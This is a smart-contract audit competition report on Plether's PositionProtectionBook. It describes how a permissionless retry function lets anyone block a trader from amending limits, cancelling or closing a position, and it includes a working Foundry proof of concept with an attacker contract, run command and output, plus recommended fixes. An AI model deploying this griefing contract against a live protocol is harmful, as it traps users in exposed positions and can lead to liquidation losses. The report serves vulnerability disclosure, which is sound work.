# \#98154 [SC-High] Permissionless `retryPositionProtectionClose` lets anyone keep a protected trader from amending limits, cancelling, or closing (griefing)

**Submitted on Nov 5th 2026 at 15:04:09 UTC by @daivo for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98154
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Permanent freezing of unclaimed yield
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

`PositionProtectionBook.amendLatchedPositionProtectionCloseLimits` lets a trader fix the close ceilings of a protection whose close attempt failed, but only while the protection is `Latched`. Anyone can call `retryPositionProtectionClose`, which moves the protection from `Latched` back to `Triggered`. An unprivileged attacker can therefore execute the failing attempt and re-queue it in one transaction. The protection is then never `Latched` between transactions, so the owner can never amend the limits. While the protection is `Triggered`, the trader also cannot cancel the protection, replace it, or submit a manual close. The position stays open and exposed to the market, and can go on to liquidation. The attacker pays only gas.

## Vulnerability Details

The MED-9 fix (#124) made a trader's close ceilings binding for every TP/SL close attempt. To let the trader recover if those ceilings are too tight, it added `amendLatchedPositionProtectionCloseLimits`. The docs (WORKING_WITH_AI_AGENTS.md, CANONICAL_ENTRYPOINTS.md) promise:

> "If a queued close fails … protection becomes `Latched`; the owner may amend its limits before retrying."

The amendment works only in a narrow state: the protection is `Latched` **and** the account has no pending order. Re-queuing an attempt has no such limit; anyone can do it:

```solidity
// PositionProtectionBook.sol#L315-L328
function amendLatchedPositionProtectionCloseLimits(uint64 protectionId, CloseFinancialLimits calldata limits)
    external nonReentrant
{
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender); // owner only
    if (protection.status != PositionProtectionStatus.Latched) revert OrderRouter__ProtectionNotLatched();
    if (ROUTER.pendingOrderCounts(msg.sender) != 0) revert OrderRouter__PendingOrdersExist();
    _setCloseLimits(protection, limits);
    ...
}

// PositionProtectionBook.sol#L382-L405
function retryPositionProtectionClose(uint64 protectionId) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);              // <-- anyone
    if (protection.status != PositionProtectionStatus.Latched) revert OrderRouter__ProtectionNotLatched();
    _requireMatchingPosition(protection);
    if (router.pendingOrderCounts(protection.account) != 0) revert OrderRouter__PendingOrdersExist();
    ...
    linkedOrderId = ROUTER.commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
    _recordCloseAttempt(protection, linkedOrderId);   // status -> Triggered, account now has a pending order
}
```

`_activeProtection` checks only that the protection exists and is active. It does not check the caller, unlike `_ownedActiveProtection`.

While the protection is `Triggered` (or `Latched`), every other way out is closed:

- `cancelPositionProtection` and `cancelPositionProtectionAndCommitClose` accept only `PendingOpen`/`Armed`, and revert with `OrderRouter__ProtectionNotArmed` (`_cancel`, `PositionProtectionBook.sol`).
- `replacePositionProtection` is likewise unavailable.
- `router.commitOrder(close)` reverts with `OrderRouter__ProtectionActive` because of the account trade lock:

```solidity
// router/OrderLiquidationBatchLogic.sol#L313-L315
if (enforceProtectionLock && host.positionProtectionBook().activePositionProtectionId(account) != 0) {
    revert OrderRouter__ProtectionActive();
}
```

The re-queued attempt is a copy of the failed one: the ceilings are the same and the trigger is not re-checked. If the stored ceilings are why the close fails (e.g. `ConstraintViolation` on `maxExecutionNotionalAssets`), every retry fails the same way and relatches.

**Attack.** The attacker deploys a contract that, in a single transaction:

1. calls the public `router.executeOrder(attemptId, pythData)`. The attempt fails terminally and the protection becomes `Latched`;
2. calls `book.retryPositionProtectionClose(protectionId)`. The protection becomes `Triggered` again, with a new live attempt.

Because both steps run in one transaction, the protection is never `Latched` at a transaction boundary. Every owner call to `amendLatchedPositionProtectionCloseLimits` reverts with `ProtectionNotLatched`. The attacker repeats this each block. Attempts carry a zero bounty and the Pyth update fee is negligible, so the only cost is gas, and no capital is needed.

The protocol's own runbook (DEPLOYMENT.md, "Position protection keepers") admits the behaviour but leaves it to keepers: *"do not continuously queue the same failing attempt"*. Nothing on-chain enforces this, and a malicious third party is not bound by the runbook.

## Impact Details

While the griefer keeps going, the trader:

- cannot relax the close ceilings, which the protocol explicitly says they may amend;
- cannot cancel or replace the protection;
- cannot submit a manual close or any other order on the account (`OrderRouter__ProtectionActive`).

The position therefore stays open and fully exposed to market risk with no exit. Some examples: a take-profit with a too-tight notional ceiling, or a stop-loss whose ceilings no longer fit after fees, carry or the frozen spread changed. If the price moves against the trader, they cannot exit, and this can end in liquidation. The trader then loses the liquidation charge and their remaining equity. The attacker gains nothing. This is direct damage to users with no profit motive, which is the program's **Griefing** impact (Medium).

**Mitigating factor.** A trader using a smart account (e.g. the supported `SimpleAccount`) can batch `executeOrder(attempt)`, `amendLatchedPositionProtectionCloseLimits` and `retryPositionProtectionClose` in one transaction and get out. An EOA trader must race the griefer across two transactions. A griefer watching the Arbitrum sequencer feed can re-queue in the same or the next block, so the EOA trader loses the race every time.

## References

- `amendLatchedPositionProtectionCloseLimits`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328
- `retryPositionProtectionClose`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L405
- `_cancel` status check: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L407-L418
- `_ownedActiveProtection` / `_activeProtection`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L983-L1000
- Account trade lock: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315
- Docs: WORKING_WITH_AI_AGENTS.md, CANONICAL_ENTRYPOINTS.md (latched-limit amendment promise); DEPLOYMENT.md "Position protection keepers" (off-chain-only mitigation)
- Existing test for the intended flow: `test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry`

### Recommendation

Do not let third parties re-queue an attempt that failed for a reason only the owner can fix. Any one of these works:

- Allow non-owners to call `retryPositionProtectionClose` only after an expiry failure (`Expired` / `ExpiredReservationMismatch`). After `ConstraintViolation`, `Slippage`, `PlannerRejected` or `ExecutionModeDisallowed`, require the owner (or an operator) to retry.
- Or let the owner amend limits while an attempt is live, and apply the new limits to the live child's pending policy.
- Or give the owner an exclusive cool-down window after a relatch (e.g. N seconds) during which only they may retry.

---

## Proof of Concept

### Step-by-step

1. Alice opens a LONG position and creates a take-profit protection with `closeLimits.maxExecutionNotionalAssets = 1e6`, a ceiling too tight to fill. This is the same setup as the existing test `test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry`.
2. The price reaches the take-profit and a keeper calls `triggerPositionProtection`. A close attempt is queued and the protection is `Triggered`.
3. The attacker (any address) deploys `LatchGriefer` and calls `grief()`. In one transaction it:
   - calls `router.executeOrder(attemptId, pythData)`, so the attempt fails with `ConstraintViolation` and the protection becomes `Latched`;
   - calls `book.retryPositionProtectionClose(protectionId)`, so a new identical attempt is queued and the protection is `Triggered` again.
4. After the transaction, Alice tries to recover:
   - `amendLatchedPositionProtectionCloseLimits(protectionId, relaxed)` reverts with `OrderRouter__ProtectionNotLatched`;
   - `cancelPositionProtection(protectionId)` reverts with `OrderRouter__ProtectionNotArmed`.
5. Steps 3–4 repeat for 10 rounds, each in a new L2 block with a fresh price tick. Alice never gets out.
6. Alice's manual `router.commitOrder(close)` reverts with `OrderRouter__ProtectionActive`.
7. Alice's position size is unchanged. She is still fully exposed and cannot exit.

### Foundry test

File: `packages/perps/test/perps/poc/M001_LatchedAmendGrief.t.sol` (uses the existing `PositionProtectionTest` fixture)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.35;

import {PositionProtectionTest} from "../spec/trader/PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {console2} from "forge-std/console2.sol";

interface IRouterExec {
    function executeOrder(uint64 orderId, bytes[] calldata data) external payable returns (OrderV3Types.ExecutionResult memory);
}

/// @dev Unprivileged griefer: executes the doomed attempt (it relatches) and re-queues it in the same transaction,
///      so the Latched state - the only state in which the owner may amend limits - never exists between transactions.
contract LatchGriefer {
    function grief(IRouterExec router, IPositionProtectionActions book, uint64 attemptId, uint64 protectionId, bytes[] calldata data)
        external
        returns (uint64 nextAttemptId)
    {
        router.executeOrder(attemptId, data);
        nextAttemptId = book.retryPositionProtectionClose(protectionId);
    }
}

contract M001_LatchedAmendGrief is PositionProtectionTest {

    function test_M001_griefKeepsTraderFromAmendingOrExiting() public {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);

        // Trader sets a take-profit with a tight notional ceiling (the MED-9 fix lets them amend it if it fails).
        PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);
        params.closeLimits.maxExecutionNotionalAssets = 1e6;
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);

        uint64 attemptId = _triggerAt(protectionId, LONG_TAKE_PROFIT);
        LatchGriefer griefer = new LatchGriefer();

        PositionProtectionTypes.CloseFinancialLimits memory relaxed = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });

        for (uint256 round; round < 10; ++round) {
            bytes[] memory data = _mockPythUpdateData(LONG_TAKE_PROFIT); // next L2 block, newer tick
            attemptId = griefer.grief(IRouterExec(address(router)), protectionActions, attemptId, protectionId, data);

            // Between griefer transactions the protection is always Triggered with a live attempt.
            assertEq(
                uint8(protectionViews.getPositionProtection(protectionId).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered)
            );
            // 1) owner cannot amend the limits the docs promise they can amend
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, relaxed);
            // 2) owner cannot cancel the protection
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
            protectionActions.cancelPositionProtection(protectionId);
        }

        // 3) owner cannot submit an ordinary close either (account trade lock while protection is active)
        OrderV3Types.OrderRequest memory close;
        close.clientOrderId = keccak256("alice-manual-exit");
        close.side = CfdTypes.Side.LONG;
        close.sizeDelta = POSITION_SIZE;
        close.targetPrice = type(uint256).max;
        close.isClose = true;
        close.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(close);

        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, POSITION_SIZE, "trader still exposed after 10 grief rounds");
        console2.log("grief rounds", uint256(10), "trader position still open, limits never amendable");
    }
}
```

### Run

```
forge test --root packages/perps --match-path 'test/perps/poc/M001*.t.sol' --match-test test_M001 -vv
```

Output:

```
[PASS] test_M001_griefKeepsTraderFromAmendingOrExiting()
Logs:
  grief rounds 10 trader position still open, limits never amendable
```

